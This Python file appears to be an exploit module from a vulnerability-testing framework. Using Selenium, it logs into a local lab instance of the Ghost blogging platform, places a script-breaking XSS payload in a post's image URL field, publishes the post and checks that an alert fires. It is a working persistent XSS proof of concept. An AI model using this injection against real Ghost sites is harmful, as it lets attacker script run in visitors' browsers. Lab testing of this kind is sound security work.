__author__ = 'root'

from selenium.webdriver.common.by import By
from data.exploits.framework.BasicExploit import BasicExploit


class Exploit(BasicExploit):

    attributes = {
      'Name' :        'Ghost_Post_Image',
      'Description' : "Insert a malformed input in the url of the post image",
      'References' :  [["EMPTY"]],
      'Target' :      "Ghost",
      'Container': 'ubuntu-node',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'Persistent XSS'
    }

    def runExploit(self):
        ghost = self.wrapper
        ghost.navigate("http://localhost:49160/ghost")
        ghost.find("email").keys("author@lab.com")
        ghost.find("password").keys("qwertyqwerty")
        ghost.find("button.btn.btn-blue").click()

        ghost.find("a.ember-view.btn.btn-green").click()
        ghost.find("button.post-settings").click()
        ghost.find("a.image-url").click()
        ghost.find("input.url.js-upload-url").clear()
        ghost.find("input.url.js-upload-url").keys("\" /><script>alert('xss')</script>")
        ghost.find("button.btn.btn-blue.js-button-accept").click()
        ghost.find("button.close.icon-x.settings-menu-header-action").click()
        ghost.find("button.ember-view.closed.btn.btn-sm.btn-blue.dropdown-toggle.up").click()
        ghost.find("Publish Now").click()
        ghost.find("(//button[@type='button'])[2]").click()


        ghost.find("name").click()
        ghost.find("Sign Out").click()

        ghost.navigate("http://localhost:49160/untitled/")

        alert_text = ghost.handle_alert()
        self.assertIn("xss", alert_text, "Exploit didn't work!")





